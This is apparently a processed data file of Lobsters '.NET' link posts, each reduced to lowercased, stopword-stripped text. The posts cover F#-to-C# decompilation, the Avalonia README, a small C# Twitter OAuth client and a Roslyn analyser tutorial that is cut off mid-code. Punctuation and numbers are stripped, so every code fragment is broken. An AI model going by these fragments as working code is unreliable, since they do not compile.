generated c code mention type finalgamescore many place tool like resharper useful want rename thing second mapscore function simple example higher order function take int int function change score normal c would represented func int int f func type fsharpfunc need expose higher order function f c probably need change function type func source code two implementation available pattern matching finally see f pattern matching code look like turned c code simple pattern matching start simple integer pattern match code integer pattern matching plus guard x finally wildcard demonstrates simple pattern matching let intpatternmatching x match x example guard e x even wildcard generated code straightforward switch statement public static string intpatternmatching int x switch x case return case return case return case return default x return even return nested matching value matching primitive f nested pattern matching access internal value example say person type contains name type f write type name first string last string type person name name age int demonstrates nested pattern matching let nestedpatternmatching person match person name first jane last doe jane doe name first jane jane something name last doe something doe example guard ageage age adult wildcard generated code look like c quite clunky similar would write hand public static string nestedpatternmatching person person stringequals personnamefirst jane stringequals personnamelast doe return jane doe return jane something else stringequals personnamelast doe return something doe personage return adult return note static stringequals used avoid additional null check personnamefirst personnamelast pattern matching parameter f support pattern matching function parameter well great way specify parameter type extract value one step example following code extract inner string email value lowercase return new email value demonstrates inparameter pattern matching let lowercaseemail email e etolowerinvariant email c similar except parameter type must given explicitly summary demonstrates inparameter pattern matching summary public static email lowercaseemail email email var lower emailitemtolowerinvariant return emailnewemail lower list pattern matching come pattern matching list f provides nice syntax fixed sized list eg b head tail eg b rest demonstrates listtesting pattern matching let listtesting list match list sprintf empty list b sprintf exactly two element b b rest sprintf two element starting b rest sprintf one element starting look generated code pattern matching consists series statement shown public static string listtesting fsharplist list test empty var listtailornull null return extratopleveloperatorsprintformattostring new printfformat string unit string string unit empty list first element valid var firstelem listheadordefault test one element null var print extratopleveloperatorsprintformattostring new printfformat fsharpfunc string unit string string one element starting return printinvoke firstelem second element valid var secondelem test exactly two element var null var extratopleveloperatorsprintformattostring new printfformat fsharpfunc fsharpfunc string unit string string tuple exactly two element return firstelem invoke secondelem test two element var extratopleveloperatorsprintformattostring new printfformat fsharpfunc fsharpfunc string unit string string tuple two element starting return firstelem invoke secondelem note simplified real generated code somewhat maintaining core feature longwinded extratopleveloperatorsprintformattostring external name sprintf obviously writing c would use stringformat curried form invoked twice parameter replacing f printing stringformat idiomatic c version would look like public static string listtesting fsharplist list test empty var listtailornull null return empty list first element valid var firstelem listheadordefault test one element null return stringformat one element starting firstelem second element valid var secondelem test exactly two element var null return stringformat exactly two element firstelem secondelem test two element return stringformat two element starting firstelem secondelem typetesting pattern matching finally look pattern matching type done using operator demonstrates typetesting pattern matching let typetesting obj match box obj string sprintf obj string value int sprintf obj int value person p sprintf obj person name pnamefirst pnamelast sprintf obj something else generated code look like public static string typetesting obj note simplified version real generated code var str obj string str null var printstring extratopleveloperatorsprintformattostring new printfformat fsharpfunc string string unit string string string obj string value return printstringinvoke str languageprimitivesintrinsicfunctionstypetestgeneric int obj var int obj object var printint extratopleveloperatorsprintformattostring new printfformat fsharpfunc int string unit string string int obj int value return printintinvoke var person obj person person null var printperson extratopleveloperatorsprintformattostring new printfformat fsharpfunc string fsharpfunc string string unit string string tuple string string obj person name return printpersoninvoke personnamefirst invoke personnamelast return extratopleveloperatorsprintformattostring new printfformat string unit string string unit obj something else note simplified real generated code somewhat maintaining core feature note f code never test string person null null case handled wildcard branch generated code null test added printperson curried form invoked twice parameter source code pattern matching example available summary title post decompiled c primary purpose post demonstrate kind boilerplate code f compiler generates service people tool like ilspy handy subtitle post c code write get functionality f stopped using f wanted write equivalent code c would obviously code generated f compiler lot stuff would bother reproduce writing equivalent c hand example might need implement compareto many case many method generated code might tweaked smaller nevertheless even caveat even writing compact idiomatic c code possible hard create say immutable wrapper type equality line c code unfortunately overhead discourages creating small class model domain encourages code smell sacrificing good design maybe even introducing bug language make painful want think sorry meant gloat attack c example f provides free edit based feedback comment tweaked c code idiomatic using autoproperties etc also summary body text updated complete code post available github comment please enable javascript view comment powered disqus blog comment powered
481,Lobsters,dotnet,"C#, F#, .NET programming",Avalonia - A Multi-Platform .NET UI Framework,https://github.com/AvaloniaUI/Avalonia,avalonia multiplatform net ui framework,avaloniaui generalpurpose desktop app development note using nightly build feed roadmap breaking change past breaking change awesome avalonia getting started visual studio extension documentation http wwwnugetorgpackagesavalonia showcase jetbrains rider issue bleeding edge build nightly build documentation http avaloniauinetdocs tutorial building using build instruction contributing contribution guideline code conduct net foundation code conduct licence mit licence contributor contribute backer become backer sponsor become sponsor net foundation net foundation,avaloniaui avalonia crossplatform xamlbased ui framework providing flexible styling system supporting wide range operating system window via net framework net core linux via xorg macos avalonia ready generalpurpose desktop app development however may bug breaking change continue along project development note ui theme see picture still workinprogress available upcoming avalonia release however connect nightly build feed install latest prerelease version avalonia nuget package willing help development testing see using nightly build feed info see status feature please see roadmap also see breaking change planned past breaking change awesome avalonia communitycurated list awesome avalonia ui tool library project resource go see people building avalonia getting started avalonia visual studio extension contains project control template help get started use net core cli starter guide see documentation avalonia delivered via nuget package manager find package http wwwnugetorgpackagesavalonia use command package manager console install avalonia manually installpackage avalonia installpackage avaloniadesktop showcase example uis built avalonia jetbrains rider need develop avalonia app jetbrains rider go vote issue tracker jetbrains wo nt thing without user telling want feature make happen bleeding edge build also nightly build track current state master although package le stable release nugetorg get latest feature bugfixes right away many user actually prefer feed documentation documentation found website http avaloniauinetdocs also tutorial newcomer building using see build instruction contributing please read contribution guideline submitting pull request code conduct project adopted code conduct defined contributor covenant clarify expected behavior community information see net foundation code conduct licence avalonia licenced mit licence contributor project exists thanks people contribute contribute backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor net foundation project supported net foundation
482,Lobsters,dotnet,"C#, F#, .NET programming",Simple C# (around 80 LoC) for posting a tweet using OAuth; no libraries,http://blog.dantup.com/2016/07/simplest-csharp-code-to-post-a-tweet-using-oauth/,simple c around loc posting tweet using oauth library,edit posted dart port code singleuser oauth bad authentication data creating signature page,edit posted dart port code year meaning automate posting tweet couple twitter account run always lazybusy week time decided get done many reason including parent taught take binary dependency stranger internet decided use lineofcode third party library instead write simplest code needed googling people implementation simplest code post tweet see getting actually find stumbled across page twitter site singleuser oauth allows generate token authenticating without go normal oauth ballache obviously account massively simplifies thing using single access token need implement entire oauth token acquisition dance instead pick point working access token make signed request twitter resource work fairly straight forward also requires oauth signature oauth header bit pain build big string data specific order specific encoding hash secret key got implemented thought sent twitter go get bad authentication data response zero information exactly wrong great much keyboardbashing ragequit night stupid twitter muchrequired sleep realised creating signature page twitter actually gave example including secret key timestamp perfect test case testing hashing code even give value step algorithm help track going wrong issue turned mostly encoding tried using webutilityurlencode uriescapeuristring neither encoded space plus way twitter excepted turned uriescapedatastring encode exactly twitter requires total class turned around line code without comment provided entirety easy copypasting nuget package anyone tell trust binary dependency stranger internet summary simple class sending tweet twitter using singleuser oauth http devtwittercomoauthoverviewsingleuser get access key creating app appstwittercom visiting key access token section app found access token heading summary class twitterapi const string twitterapibaseurl http readonly string consumerkey consumerkeysecret accesstoken accesstokensecret readonly sighasher readonly datetime epochutc new datetime datetimekindutc summary creates object sending tweet twitter using singleuser oauth get access key creating app appstwittercom visiting key access token section app found access token heading summary public twitterapi string consumerkey string consumerkeysecret string accesstoken string accesstokensecret thisconsumerkey consumerkey thisconsumerkeysecret consumerkeysecret thisaccesstoken accesstoken thisaccesstokensecret accesstokensecret sighasher new new asciiencoding getbytes stringformat consumerkeysecret accesstokensecret summary sends tweet supplied text return response twitter api summary public task string tweet string text var data new dictionary string string status text trimuser return sendrequest statusesupdatejson data task string sendrequest string url dictionary string string data var fullurl twitterapibaseurl url timestamps second since var timestamp int datetimeutcnow epochutc totalseconds add oauth header need use constructing hash dataadd oauthconsumerkey consumerkey dataadd oauthsignaturemethod dataadd oauthtimestamp timestamptostring dataadd oauthnonce required twitter nt appear use dataadd oauthtoken accesstoken dataadd oauthversion generate oauth signature add payload dataadd oauthsignature generatesignature fullurl data build oauth http header data string oauthheader generateoauthheader data build form data exclude oauth stuff already header var formdata new formurlencodedcontent datawhere kvp kvpkeystartswith oauth return sendrequest fullurl oauthheader formdata summary generate oauth signature oauth header value summary string generatesignature string url dictionary string string data var sigstring stringjoin data union data select kvp stringformat uriescapedatastring kvpkey uriescapedatastring kvpvalue orderby var fullsigdata stringformat post uriescapedatastring url uriescapedatastring sigstringtostring return sighashercomputehash new asciiencoding getbytes fullsigdatatostring summary generate raw oauth html header value including signature summary string generateoauthheader dictionary string string data return oauth stringjoin data kvp kvpkeystartswith oauth select kvp stringformat uriescapedatastring kvpkey uriescapedatastring kvpvalue orderby summary send http request return response summary async task string sendrequest string fullurl string oauthheader formurlencodedcontent formdata using var http new httpclient httpdefaultrequestheadersadd authorization oauthheader var httpresp await httppostasync fullurl formdata var respbody await httprespcontentreadasstringasync return respbody use var twitter new twitterapi consumerkey consumerkeysecret accesstoken accesstokensecret var response await twittertweet first automated tweet consolewriteline response free please code improve anything significantly leave comment
483,Lobsters,dotnet,"C#, F#, .NET programming",Continuous - C# and F# IDE for the iPad,http://praeclarum.org/post/147003028753/continuous-c-and-f-ide-for-the-ipad,continuous c f ide ipad,click redirected,click redirected
484,Lobsters,dotnet,"C#, F#, .NET programming",Building a BitTorrent client from scratch in C#,https://cheatdeath.github.io/research-bittorrent-doc/,building bittorrent client scratch c,redirect,redirect
485,Lobsters,dotnet,"C#, F#, .NET programming","Creating a C# (""Roslyn"") Analyser from scratch - For beginners by a beginner",http://productiverage.com/creating-a-c-sharp-roslyn-analyser-for-beginners-by-a-beginner,creating c roslyn analyser scratch beginner beginner,june bridgenet creating fresh analyser project every analyser need least one rule declare every analyser need declare supporteddiagnostics value list type rule every analyser need initialize method register type symbol actually mean moment interested symbolanalysiscontext inamedtypesymbol identifiertoken methoddeclaration classdeclaration namespacedeclaration compilationunit identifiertoken writing real analyser bridgereact selectattributes selectattributes diagnosticverifier diagnosticverifier metadatareference writing analyser identifiertoken simpleassignment objectinitializerexpression objectcreationexpression variabledeclaration objectinitializerexpression objectinitializerexpression analysiscontext analysiscontext objectinitializerexpression roslynclrheapallocationanalyzerexplicitallocationanalyzercs action symbolanalysiscontext syntaxnodeanalysiscontext action symbolanalysiscontext action syntaxnodeanalysiscontext symbolanalysiscontext syntaxnodeanalysiscontext syntaxnode selectattributes selectattributes syntaxnode assignmentexpressionsyntax identifiernamesyntax identifiernamesyntax selectattributes objectcreationexpression objectinitializerexpressionsyntax objectinitializerexpressionsyntax objectcreationexpressionsyntax objectcreationexpression objectinitializerexpressionsyntax typeinfo selectattributes localisation support name value name value name value summary bridgenet selectattributes complete analyser,june meaning try writing post creating analyser little technology think huge promise improving code quality something successfully played around recently still much early phase proficient something sit bang easily ie without lot googling wo nt post expert hoping use advantage since hopefully remember pain point well go sort thing try hashing analyser writing library work bridgenet introduces complication hoping talk problem overcome later post one general introduction creating fresh analyser project easiest way get started use microsoft template first need install visual studio sdk go file new project choose c left navigation pane click extensibility select install visual studio extensibility tool may already installed optional component see link install visual studio extensibility tool hopefully next extensibility section need select download net compiler platform sdk ensure project template installed going use installs helpful tool syntax visualizer see moment template since already file new project c extensibility select analyzer code fix nuget vsix create example analyser solution fully operational analyser split three project analyser unit test library vsix project last one would used wanted create analyser would installed applied project would ever open apply specific library talking creating analyser work particular library would distributed library everyone consuming library benefit keep thing simple delete vsix project example analyser template installs something simple look class name upper case warns term functionality particularly useful term education illustrating get started good jumping point fact project includes analyser also code fix nonalluppercase class name identified warned quick fix offered ide change name match upper case regime pushing code fix really helpful talk another day think already plenty deal post analyser class look basically like removed comment replaced localisable string hardcoded string make little le absorb using systemcollectionsimmutable using systemlinq using microsoftcodeanalysis using microsoftcodeanalysisdiagnostics namespace exampleanalyser diagnosticanalyzer languagenamescsharp public class exampleanalyseranalyzer diagnosticanalyzer public const string diagnosticid exampleanalyser private const string category naming private static readonly localizablestring title type name contains lowercase letter private static readonly localizablestring messageformat type name contains lowercase letter private static readonly localizablestring description type name uppercase private static diagnosticdescriptor rule new diagnosticdescriptor diagnosticid title messageformat category diagnosticseveritywarning isenabledbydefault true description description public override immutablearray diagnosticdescriptor supporteddiagnostics get return immutablearraycreate rule public override void initialize analysiscontext context contextregistersymbolaction analyzesymbol symbolkindnamedtype private static void analyzesymbol symbolanalysiscontext context var namedtypesymbol inamedtypesymbol contextsymbol namedtypesymbolnametochararray charislower contextreportdiagnostic diagnosticcreate rule namedtypesymbollocations namedtypesymbolname summarise code every analyser need least one rule declare rule various property diagnostic id category title messageformat description severity two immediately interesting severity make warning point potential mistake make error indicate critical problem prevent build completed messageformat since messageformat responsible text displayed user error list messageformat support string replacement example see placeholder messageformat diagnosticcreate called argument namedtypesymbolname injected placeholder every analyser need declare supporteddiagnostics value list type rule possible analyser raise vital order analyser work correctly runtime create analyser three different type rule report forget declare one type supporteddiagnostics property actually analyser installed template point mistake great example analyser protect compile time potential runtime problem every analyser need initialize method register type symbol actually mean moment interested provides reference method perform actual analysis simple task class look named type ie class structs inspect name ensure consist entirely capital letter remember example included analyzer code fix nuget vsix template simply educational purpose believed class name shoutingformat class nt allcaps name result warning error list illustrate work test project includes following test method testmethod public void var test using system using systemcollectionsgeneric using systemlinq using systemtext using systemthreadingtasks using systemdiagnostics namespace class typename var expected new diagnosticresult id exampleanalyser message stringformat type name contains lowercase letter typename severity diagnosticseveritywarning location new new diagnosticresultlocation verifycsharpdiagnostic test expected make clear see precisely sort thing analyser looking also give u another immediate benefit actually execute analyser step debugger want poke around exactly symbolanalysiscontext reference want look property particular inamedtypesymbol instance easy putting breakpoint analyzesymbol method example analyser going back test class rightclicking within selecting debug test want introduce one useful technique moving use syntax visualizer analyser work inmemory tree node represent source code file looking unit test named symbol typename child node typename class declaration child node namespace child toplevel construct called compilationunit understanding various type node key writing analyser syntax visualizer make little bit easier although analyser start examining source code particular file also possible look type value referenced code live elsewhere find namespace class referenced exists example determine argument method called exists different library lookup expensive looking solely content current file however done strictly necessary see shortly looking content parsed current file looking syntax tree looking reference elsewhere solution accessing semantic model installed net compiler platform sdk earlier access tool go view window syntax visualizer show syntax tree code within project click name see identifiertoken name child node methoddeclaration child node classdeclaration child node namespacedeclaration child node compilationunit click node syntax visualiser inspect property node open branch inspect example block node appear shortly identifiertoken may click reveal node represent statement within method writing real analyser going walk analyser created recently starting scratch hopefully encountering problem last time illustrate find solve analyser part bridgereact library wo nt need know anything react bridge follow along root problem relates rendering html select element three related property consider rendering select element multiple value value multiple boolean indicates whether element support single selection false zero one selection true rendering element preselected item value value property must used value string value string array multiple false value set react display warning runtime ignore value similarly multiple true value set wanted analyser handled simple case fine return domselect new selectattributes multiple false value x fine return domselect new selectattributes multiple true value new x wrong nt use value multiple true return domselect new selectattributes multiple true value x wrong nt use value multiple false return domselect new selectattributes multiple false value new x wrong nt use value multiple default false return domselect new selectattributes value new x worth mentioning considering simple case analyser wo nt perfect multiple set according variable going try follow possible code path ensure never truefalse valuesvalue set also going cater technicallyvalid case someone instantiates selectattributes set value initially leaf multiple false set multiple true later line code would valid would runtime warning think would clearer set multiple value together case imposing believe best practice consumer library analyser nt keep thing simple possible instead trying pull real bridgereact library create another class library project solution work call bridgereact rename file automatically created part class library project selectattributescs change content following namespace bridgereact public sealed class selectattributes public bool multiple private get set public string value private get set public string value private get set enough start writing analyser want take example analyser analyzer code fix nuget vsix change ensure selectattributes property always configured according rule outlined getting started though seems like good time formalise rule decribing unit test get many bonus writing individual test may help guide u fixing one time help u focus individual problem analyser solve also provide u way exercise analyser step debugger find invaluable familiar library object model good grasp code stepping debugger feel timeconsuming helpful case like demonstrate shortly finally test help avoid regression creeping decide refactor analyser extend functionality future replace content unittestcs following using microsoftcodeanalysis using microsoftcodeanalysisdiagnostics using microsoftvisualstudiotesttoolsunittesting using testhelper namespace exampleanalysertest testclass public class unittest diagnosticverifier testmethod public void donotusevaluewhenmultipleistrue var testcontent using bridgereact namespace testcase public class example public void go new selectattributes multiple true value var expected new diagnosticresult id exampleanalyseranalyzerdiagnosticid message multiple true value property used instead value severity diagnosticseveritywarning location new new diagnosticresultlocation verifycsharpdiagnostic testcontent expected testmethod public void donotusevalueswhenmultipleisfalse var testcontent using bridgereact namespace testcase public class example public void go new selectattributes multiple false value new var expected new diagnosticresult id exampleanalyseranalyzerdiagnosticid message multiple false value property used instead value severity diagnosticseveritywarning location new new diagnosticresultlocation verifycsharpdiagnostic testcontent expected testmethod public void donotusevaluewhenmultipledefaultstofalse var testcontent using bridgereact namespace testcase public class example public void go var x new selectattributes value new xmultiple true var expected new diagnosticresult id exampleanalyseranalyzerdiagnosticid message multiple false value property used instead value severity diagnosticseveritywarning location new new diagnosticresultlocation verifycsharpdiagnostic testcontent expected protected override diagnosticanalyzer getcsharpdiagnosticanalyzer return new exampleanalyseranalyzer one important thing actually writing analyser unit test run net compiler platform referred roslyn parse compile code snippet memory mean code snippet need actually able compile currently wo nt roslyn wo nt know resolve bridgereact namespace referenced quite easily fixed diagnosticverifier class part template started configures environment option test check file called roslyn want filename work diagnosticverifier tell use also specifies assembly include building project code snippet referenced system sytemcollectionsgeneric reference work fine however nt initially know bridgereact project need tell support add reference bridgereact project exampleanalaysertest project edit file helpersdiagnosticverifierhelpercs exampleanalaysertest project add following near top metadatareference instance created private static readonly metadatareference csharpbridgereactreference metadatareferencecreatefromfile typeof bridgereactselectattributes assemblylocation open code region file add pas csharpbridgereactreference solution adding additional addmetadatareference call createproject method look like private static project createproject string source string language languagenamescsharp string filenameprefix defaultfilepathprefix string fileext language languagenamescsharp csharpdefaultfileext visualbasicdefaultext var projectid projectidcreatenewid debugname testprojectname var solution new adhocworkspace currentsolution addproject projectid testprojectname testprojectname language addmetadatareference projectid corlibreference addmetadatareference projectid systemcorereference addmetadatareference projectid csharpsymbolsreference addmetadatareference projectid codeanalysisreference addmetadatareference projectid csharpbridgereactreference int count foreach var source source var newfilename filenameprefix count fileext var documentid documentidcreatenewid projectid debugname newfilename solution solutionadddocument documentid newfilename sourcetextfrom source count return solutiongetproject projectid really writing analyser groundwork done decided precisely need documented test need write actual code although use debugger inspect syntax tree code snippet unit test point think even would information overload begin add following line one unit test method nt matter one deleted shortly bit poke around syntax visualizer var x new bridgereactselectattributes multiple true value x ensuring syntax visualizer visible view window syntax visualizer clicking multiple show following identifiertoken multiple property part simpleassignment ie multiple child objectinitializerexpression curly bracket around two property set child objectcreationexpression entire statement includes new bridgereactselectattributes setting two property part variabledeclaration set x result object creation syntax visualizer could go way top method class namespace toplevel compilationunit however interested objectinitializerexpression since contains property want verify alter analyser class currently order identify object initialisers currently example analyser class initialize method look like public override void initialize analysiscontext context contextregistersymbolaction analyzesymbol symbolkindnamedtype first thing try would see option symbolkind enum however contains thing like alias event method namedtype property nt bear much resemblance objectinitializerexpression without better plan recommend turning google symbolkind nt seem want maybe something else extract analysiscontext instance initialize method googling analysiscontext objectinitializerexpression nt actually return many result however second one roslynclrheapallocationanalyzerexplicitallocationanalyzercs code look promising public override void initialize analysiscontext context var kind new syntaxkindobjectcreationexpression syntaxkindanonymousobjectcreationexpression syntaxkindarrayinitializerexpression syntaxkindcollectioninitializerexpression syntaxkindcomplexelementinitializerexpression syntaxkindobjectinitializerexpression syntaxkindarraycreationexpression syntaxkindimplicitarraycreationexpression syntaxkindletclause contextregistersyntaxnodeaction analyzenode kind instead calling registersymbolaction passing symbolkind value call registersyntaxnodeaction pas array syntaxkind value syntaxkind enum objectinitializerexpression value actually starting change initialize method public override void initialize analysiscontext context contextregistersyntaxnodeaction analyzesymbol becomes clear method actually take params array perfectly happy u specify single syntaxkind value initialize becomes public override void initialize analysiscontext context contextregistersyntaxnodeaction analyzesymbol syntaxkindobjectinitializerexpression analyser project nt compile complains type one argument call symbolanalysiscontext definitely take syntaxkind enum second argument must first wrong intellisense indicates want first argument type action symbolanalysiscontext analyzesymbol method currently take syntaxnodeanalysiscontext action symbolanalysiscontext rather action syntaxnodeanalysiscontext easily fixed changing argument analyzesymbol method however mean cause compile error example code expecting symbolanalysiscontext want give syntaxnodeanalysiscontext matter code nt want anyway change method argument delete body making change rename something better analyzesymbol lookforinvalidselectattributeproperties public override void initialize analysiscontext context contextregistersyntaxnodeaction lookforinvalidselectattributeproperties syntaxkindobjectinitializerexpression private static void lookforinvalidselectattributeproperties syntaxnodeanalysiscontext context basic structure start work new lookforinvalidselectattributeproperties implementation context reference passed node property match syntaxkind value passed registersyntaxnodeaction contextnode reference node represents object initialisation sanity check syntaxnode class base node class kind method return syntaxkind enum value applies current node calling kind contextnode return objectinitializerexpression option syntaxkind enum reference object initialisation node go one two way want ensure type initialised selectattributes class bridgereact assembly want check whether invalid property combination specified first task involve getting type name lookup rest solution work type name come ensure actually bridgereact selectattributes class another class exists somewhere name second task requires u look property set code syntax tree already mean first task expensive perform second task try deal step two first since able avoid step one altogether invalid property combination appear look invalid property combination first syntax visualizer seen last image show individual propertysetting represented simpleassignmentexpression direct child object initialisation syntaxnode class childnodes method return child seems like good place start might able something like nt work simpleassignmentexpressionsyntax nt real class var propertyinitialisers contextnodechildnodes oftype simpleassignmentexpressionsyntax however simpleassignmentexpressionsyntax real type tried starting type simple see intellisense would pick correct name nt get anywhere next resorted deleting last line since nt compile putting breakpoint top lookforinvalidselectattributeproperties used debug test donotusevaluewhenmultipleistrue breakpoint hit ca nt see child node quickwatch childnodes method property quickwatch show property value nt offter execute method show returned go immediate window debug window immediate type following hit enter contextnodechildnodes first gettype name display assignmentexpressionsyntax clue enough stop debugger go back trying populate lookforinvalidselectattributeproperties may start var propertyinitialisers contextnodechildnodes oftype assignmentexpressionsyntax using go definition assignmentexpressionsyntax show left right property expression come either side operator always equal sign considering object property initialisation syntax visualizer show simpleassignmentexpression identifiername left able get property name try work type identifiername relates start typing identifier intellisense suggests identifiernamesyntax nt suggested anything helpful would resorted using debug test inspecting type debugger poke around identifiernamesyntax class see property identifier string property valuetext look like name property set thing coming together start lookforinvalidselectattributeproperties look like var propertyinitialisers contextnodechildnodes oftype assignmentexpressionsyntax select propertyinitialiser new propertyname identifiernamesyntax propertyinitialiserleft identifiervaluetext valueexpression propertyinitialiserright worth noting nt worry left property ever anything simple identifier assignment object initialisers ever allow simple assignment example following would compile var x new myclass namevalue ted attempting set nested property object initialisers compile c valid c nt worry passed analyser maybe worth adding another unit test around ensure invalid c ca nt result load edge case need concerned testmethod public void ignoreinvalidpropertysetting var testcontent using bridgereact namespace testcase public class example public void go new selectattributes nestedmultiple true verifycsharpdiagnostic testcontent note calling verifycsharpdiagnostic expected value mean test expects analyser report violated rule really move thing along interested property initialisers multiple clearly true false meaning set specifically true false specified leaving default value false using syntax visualizer work tell whether expression mean true constant false constant come var propertyinitialisers contextnodechildnodes oftype assignmentexpressionsyntax select propertyinitialiser new propertyname identifiernamesyntax propertyinitialiserleft identifiervaluetext valueexpression propertyinitialiserright var multiplepropertyinitialiser propertyinitialisersfirstordefault propertyinitialiser propertyinitialiserpropertyname multiple bool multiplepropertyvalue multiplepropertyinitialiser null multiplepropertyvalue false default false explicitlt set else var multiplepropertyvaluekind multiplepropertyinitialiservalueexpressionkind multiplepropertyvaluekind syntaxkindtrueliteralexpression multiplepropertyvalue true else multiplepropertyvaluekind syntaxkindfalseliteralexpression multiplepropertyvalue false else looking simple case explicitly set true false set defaulting false set according method return value variable give intended catch obvious mistake perform deep complex analysis return next thing look value value property specified appropriate multiple value found code fairly clear way following var valuepropertyisspecified propertyinitialisersany propertyinitialiser propertyinitialiserpropertyname value var valuespropertyisspecified propertyinitialisersany propertyinitialiser propertyinitialiserpropertyname value valuepropertyisspecified valuespropertyisspecified return final step ensure object initialisation looking indeed selectattributes instance bit requires lookup semanticmodel expensive looking current syntax tree need project compile work reference external code may knowing going dealing full semantic model start looking method available contextsemanticmodel see might help using intellisense documentation nt take long find gettypeinfo method take objectcreationexpression instance ideal objectinitializerexpressionsyntax know objectinitializerexpressionsyntax child objectcreationexpressionsyntax easy u get objectcreationexpression parent objectinitializerexpressionsyntax gettypeinfo return typeinfo instance two property type convertedtype convertedtype taken xml summary documentation type expression undergone implicit conversion nt apply look type note though documentation type say expression type null returned type could determined due error ierrortypesymbol returned since object creation expression always type returned type object instantiated need careful error response fine stop processing error might mean new selectattributes statement code analysed using bridgereact top file ignore error case plan analyse valid code code need adding ensure property looking bridgereactselectattributes var objectcreation objectcreationexpressionsyntax contextnodeparent var objectcreationtypeinfo contextsemanticmodelgettypeinfo objectcreation objectcreationtypeinfotype ierrortypesymbol objectcreationtypeinfotypecontainingassemblyidentityname bridgereact objectcreationtypeinfotypename selectattributes return written code strike good idea add another test one ensures nt raise false positive multiple value value case different selectattributes class declared somewhere bridgereact summary nt analyse selectattributes initialisation different selectattributes class target selectattributes class part bridgereact library summary testmethod public void onlytargetbridgereactselectattributes var testcontent namespace testcase public class example public void go new selectattributes multiple true value x public class selectattributes public bool multiple get set public string value get set verifycsharpdiagnostic testcontent required information display warning invalid multiple value value combination nt appropriate message content display got warning content example analyser project template delete code top analyser const static string rule reference supporteddiagnostics property replace public const string diagnosticid bridgereact private static readonly localizablestring title careful use appropriate value value property multiple setting private static readonly localizablestring multiplewithvaluemessage multiple true value property used instead value private static readonly localizablestring nomultiplewithvaluesmessage multiple false value property used instead value private const string category configuration private static diagnosticdescriptor multiplewithvaluerule new diagnosticdescriptor diagnosticid title multiplewithvaluemessage category diagnosticseveritywarning isenabledbydefault true private static diagnosticdescriptor nomultiplewithvaluesrule new diagnosticdescriptor diagnosticid title nomultiplewithvaluesmessage category diagnosticseveritywarning isenabledbydefault true public override immutablearray diagnosticdescriptor supporteddiagnostics get return immutablearraycreate multiplewithvaluerule nomultiplewithvaluesrule final step report rule broken following need adding end lookforinvalidselectattributeproperties method order complete multiplepropertyvalue true valuepropertyisspecified contextreportdiagnostic diagnosticcreate multiplewithvaluerule contextnodegetlocation else multiplepropertyvalue false valuespropertyisspecified contextreportdiagnostic diagnosticcreate nomultiplewithvaluesrule contextnodegetlocation localisation support one final thing good practice essential replace hardcoded string analyser class resource may potentially translated different language one day project template includes resourcesresx file move string edit file visual studio delete existing entry add following name value pair name selectattributesanalysertitle value careful use appropriate value value property multiple setting name selectattributesanalysermultiplewithvaluemessage value multiple true value property used instead value name selectattributesanalysernomultiplewithvaluestitle value multiple false value property used instead value make accessing resource little easier add following method bottom analyser class private static localizablestring getlocalizablestring string nameoflocalizableresource return new localizableresourcestring nameoflocalizableresource resourcesresourcemanager typeof resource finally replace three hardcoded string property initialisers following private static readonly localizablestring title getlocalizablestring nameof resourcesselectattributesanalysertitle private static readonly localizablestring multiplewithvaluetitle getlocalizablestring nameof resourcesselectattributesanalysermultiplewithvaluemessage private static readonly localizablestring nomultiplewithvaluestitle getlocalizablestring nameof resourcesselectattributesanalysernomultiplewithvaluestitle summary completes analyser included complete source code final implementation written nt look like much hopefully illustrates powerful complete roslyn library hopefully shown powerful library nt need daunting many resource helping understand use people written lot googling term relating want often yield helpful result people answered lot question stack overflow often find example sample code sure term use try search help using syntax visualizer explore code set right path writing test two examining contextnode reference debugger ensure building project debug mode since release build may prevent breakpoints hit may optimise variable reference away mean wo nt able use quickwatch finally nt forget lot helpful information xml summary documentation available visual studio examine roslyn class method often name method descriptive enough help choose appropriate one least give clue direction go really scraped surface analyser capable technology huge capability potential might talk us analyser talk particular analyser may implemented another day two topic definitely talk soon code fix get analyser work bridgenet library code fix interesting allow go beyond saying wrong saying may fixed automatically ide example someone changed selectattributes instantiation enable multiple selection eg started domselect new selectattributes value selectedid option changed domselect new selectattributes multiple true value selectedid option analyser could point value property used multiple true could also offer fix following automatically domselect new selectattributes multiple true value new selectedid option time warning analyser require manual intervention correct also time computer could easily correct great ability explain computer thus make life bit easier person consuming library reason also want spend little bit time talking making analyser work bridgenet library soon something special case since bridge project nt reference standard net system systemcollections etc assembly replaced special version library javascript translation mean ca nt reference bridge library project relies standard net assembly bit problem want write roslyn analyser type bridge library since analyser project rely standard net assembly analyser want reference bridge library whose rule applied analyser way get around go another time complete analyser using systemcollectionsimmutable using systemlinq using systemreflection using microsoftcodeanalysis using microsoftcodeanalysiscsharp using microsoftcodeanalysiscsharpsyntax using microsoftcodeanalysisdiagnostics namespace exampleanalyser diagnosticanalyzer languagenamescsharp public sealed class exampleanalyseranalyzer diagnosticanalyzer public const string diagnosticid bridgereact private static readonly localizablestring title getlocalizablestring nameof resourcesselectattributesanalysertitle private static readonly localizablestring multiplewithvaluetitle getlocalizablestring nameof resourcesselectattributesanalysermultiplewithvaluemessage private static readonly localizablestring nomultiplewithvaluestitle getlocalizablestring nameof resourcesselectattributesanalysernomultiplewithvaluestitle private const string category configuration private static diagnosticdescriptor multiplewithvaluerule new diagnosticdescriptor diagnosticid title multiplewithvaluetitle category diagnosticseveritywarning isenabledbydefault true private static diagnosticdescriptor nomultiplewithvaluesrule new diagnosticdescriptor diagnosticid title nomultiplewithvaluestitle category diagnosticseveritywarning isenabledbydefault true public override immutablearray diagnosticdescriptor supporteddiagnostics get return immutablearraycreate multiplewithvaluerule nomultiplewithvaluesrule public override void initialize analysiscontext context contextregistersyntaxnodeaction lookforinvalidselectattributeproperties syntaxkindobjectinitializerexpression private static void lookforinvalidselectattributeproperties syntaxnodeanalysiscontext context var propertyinitialisers contextnodechildnodes oftype assignmentexpressionsyntax select propertyinitialiser new propertyname identifiernamesyntax propertyinitialiserleft identifiervaluetext valueexpression propertyinitialiserright var multiplepropertyinitialiser propertyinitialisersfirstordefault propertyinitialiser propertyinitialiserpropertyname multiple bool multiplepropertyvalue multiplepropertyinitialiser null multiplepropertyvalue false default false explicitlt set else var multiplepropertyvaluekind multiplepropertyinitialiservalueexpressionkind multiplepropertyvaluekind syntaxkindtrueliteralexpression multiplepropertyvalue true else multiplepropertyvaluekind syntaxkindfalseliteralexpression multiplepropertyvalue false else looking simple case explicitly set true false set defaulting false set according method return value variable give intended catch obvious mistake perform deep complex analysis return var valuepropertyisspecified propertyinitialisersany propertyinitialiser 